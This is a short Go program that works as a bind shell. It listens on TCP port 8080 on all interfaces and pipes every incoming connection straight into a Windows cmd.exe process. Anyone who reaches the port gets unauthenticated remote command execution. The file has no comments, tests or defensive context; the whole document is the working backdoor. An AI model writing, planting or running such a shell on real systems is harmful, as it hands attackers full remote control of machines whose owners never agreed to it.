package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("Error:", err)
	}
	defer listener.Close()

	fmt.Println("Listening on 0.0.0.0:8080")
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}

		go handle(conn)
	}
}

func handle(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("cmd.exe")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Run(); err != nil {
		fmt.Println("Can not open cmd, error:", err)
	}
}
